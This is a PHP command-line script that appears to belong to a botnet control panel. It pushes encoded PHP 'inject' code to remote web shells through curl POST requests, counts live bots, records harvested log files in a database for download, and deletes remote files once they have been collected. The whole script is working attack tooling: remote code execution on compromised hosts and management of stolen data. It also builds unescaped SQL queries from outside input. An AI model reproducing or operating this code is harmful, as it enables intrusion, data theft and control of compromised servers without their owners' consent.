#!/usr/bin/env php
<?php

set_time_limit(0);
error_reporting(-1);
ini_set('max_execution_time', 0);
ini_set('memory_limit', '512M');

function real_path($p){
	return str_replace('//', '/', str_replace('\\', '/', realpath($p)) . '/');
}

if(file_exists('../cache/dirs_checks.json')) $dir = json_decode(file_get_contents('../cache/dirs_checks.json'), true);
if(empty($dir['script']) || empty($dir['site']) || empty($dir['logs'])){
	$dir = array();
	$dir['script'] = pathinfo(__FILE__, PATHINFO_DIRNAME);
	$dir['site'] = real_path($dir['script'] . '/../');
	$dir['logs'] = real_path($dir['site'] . '/logs/');
	file_put_contents($dir['site'] . 'cache/dirs_checks.json', json_encode($dir));
}

ini_set('error_log', $dir['site'] . 'cache/error_check_file.txt');
function error_import_handler($code, $msg, $file, $line){
	global $dir;
	if($code != 8 && !strpos($file, 'geoip.inc')) file_put_contents($dir['site'] . 'cache/error_check_file.txt', print_r(array('code' => $code, 'msg' => $msg, 'file' => $file, 'line' => $line), true) . "\r\n", FILE_APPEND);
}
set_error_handler('error_import_handler');

if(!defined('IDOS')) define('IDOS', strtoupper(substr(PHP_OS, 0, 3)));

if(IDOS === 'WIN'){
	exec($dir['script'] . 'pv.exe -pi php-*.exe');
}else{
	exec('/bin/env renice 0 -p ' . $MYPID);
}

include_once($dir['site'] . 'includes/config.php');
require_once($dir['site'] . 'classes/mysqli.class.lite.php');
$mysqli = new mysqli_db();

$mysqli->connect($cfg_db['host'], $cfg_db['user'], $cfg_db['pass'], $cfg_db['db']);
$mysqli->settings["ping"] = true;

unset($cfg_db);
if(count($mysqli->errors) > 0){
	error_log('DB_ERROR: ' . print_r($mysqli->errors, true),4);
	exit;
}

if(empty($_SERVER['argv'][1])){
	error_log('EMPTY_ID!',4);
	exit;
}

$MYPID = getmypid();
if(!empty($MYPID)){
	$thread = $mysqli->query('SELECT * FROM bf_threads WHERE (id = \''.$_SERVER['argv'][1].'\') LIMIT 1');
	if($thread->id != $_SERVER['argv'][1]){
		error_log('NOT_ID!',4);
		exit;
	}else{
		$mysqli->query('update bf_threads set pid = \''.$MYPID.'\', status = \'2\', last_date = CURRENT_TIMESTAMP WHERE (id = \''.$thread->id.'\')');
	}
}else{
	error_log('PID_ERROR',4);
    exit;
}

$admins = $mysqli->query('SELECT * FROM bf_admins WHERE (id = \''.$thread->post_id.'\') LIMIT 1');
if($admins->id != $thread->post_id){
	error_log('Admin panel not found.',4);
	exit;
}

function get_http($link, $data, $key = 'BOTNETCHECKUPDATER1234567893', $shell = '/set/task.html'){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, 'http://' . $link . $shell);
	curl_setopt($ch, CURLOPT_FAILONERROR, false);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER,true);
	curl_setopt($ch, CURLOPT_TIMEOUT, 180);
	curl_setopt($ch, CURLOPT_POST, true);
	curl_setopt($ch, CURLOPT_HTTPHEADER, array( 'Expect:' ) );
	curl_setopt($ch, CURLOPT_POSTFIELDS, 'id='.$key.'&data=' . base64_encode(bin2hex($data)));
	$return =  curl_exec($ch);
	curl_close($ch);
	return $return;
}

$get_php = '$cur_file = \''.$admins->shell.'\';';
$get_php .= file_get_contents($dir['site'] . '/modules/admins/injects/start.php');
$get_php .= '$func_name = \'gzinflate\';' . "\r\n";
$get_php .= file_get_contents($dir['site'] . '/modules/admins/injects/get_function.php');
$gzinflate = get_http($admins->link, $get_php, $admins->keyid, $admins->shell);

$get_php = '$cur_file = \''.$admins->shell.'\';';
$get_php .= file_get_contents($dir['site'] . '/modules/admins/injects/start.php');
$get_php .= file_get_contents($dir['site'] . '/modules/admins/injects/mysqli.php');
$get_php .= '$count_bots = true;' . "\r\n";

if($gzinflate == 'gzinflate'){
	$get_php .= '$gzinflate = true;' . "\r\n";
}else{
	$get_php .= '$gzinflate = false;' . "\r\n";
}

$get_php .= file_get_contents($dir['site'] . '/modules/admins/injects/get_files.php');

$c = 0;
do{
	$result = get_http($admins->link, $get_php, $admins->keyid, $admins->shell);
	if($gzcompress == 'gzinflate'){
		$list = json_decode(gzinflate($result), true);
	}else{
		$list = json_decode($result, true);
	}

	if(!isset($list['count_bots'])) $result = '';

	$c++;
}while(empty($result) && $c <= 3);

if(isset($list['count_bots'])){
	$mysqli->query('update bf_admins set count_bots=\''.$list['count_bots'].'\', live_bots=\''.$list['live_bots'].'\', update_date=NOW() WHERE (id=\''.$admins->id.'\') LIMIT 1');
	unset($list['count_bots']);
	unset($list['live_bots']);
}

$del_file = array();

if(count($list) > 0){
	foreach($list as $key => $data){
		foreach($data as $item){
			$result = $mysqli->query('select id, file, dl, size, type, status, post_date from bf_files where (type = \''.$key.'\') AND (post_id = \''.$admins->id.'\') AND (dl = \''.$item['file'].'\') LIMIT 1');
			if($result->dl == $item['file']){
				if($result->size != $item['size']){
					$mysqli->query('update bf_files set status=\'0\', import=\'0\', post_date=NOW(), size=\''.$item['size'].'\' WHERE (id=\''.$result->id.'\') LIMIT 1');
				}else{
					if($result->status == '1' && file_exists($dir['logs'] . $result->file) && filesize($dir['logs'] . $result->file) == $item['size']){
                     	$del_file[] = $result;
					}
				}
			}else{
				$mysqli->query('INSERT DELAYED INTO bf_files (dl, size, type, post_id) VALUES (\''.$item['file'].'\', \''.$item['size'].'\', \''.$key.'\', \''.$admins->id.'\')');
			}
		}
	}
}

foreach($del_file as $df){
	if((time()-strtotime($df->post_date)) > 432000){
		switch($df->type){
			case '5':
			case '7':
			case '10':
				$get_php = '$cur_file = \''.$admins->shell.'\';';
				$get_php .= file_get_contents($dir['site'] . '/modules/admins/injects/start.php');
				$get_php .= '$file_name = $dir . \''.ltrim($df->dl, '/').'\';' . "\r\n";
				$get_php .= '@unlink($file_name);';
				get_http($admins->link, $get_php, $admins->keyid, $admins->shell);
			break;

			case '6':
				$get_php = '$cur_file = \''.$admins->shell.'\';';
				$get_php .= file_get_contents($dir['site'] . '/modules/admins/injects/start.php');
				$get_php .= file_get_contents($dir['site'] . '/modules/admins/injects/mysqli.php');
				$get_php .= '$file_name = $dir . \''.ltrim($df->dl, '/').'\';' . "\r\n";
				//$get_php .= '@unlink($file_name);';
				//get_http($admins->link, $get_php, $admins->keyid, $admins->shell);
			break;
		}
	}
}

sleep(1);

$mysqli->query('update bf_threads set status = \'255\', last_date = CURRENT_TIMESTAMP WHERE (id = \''.$thread->id.'\')');

exit;

?>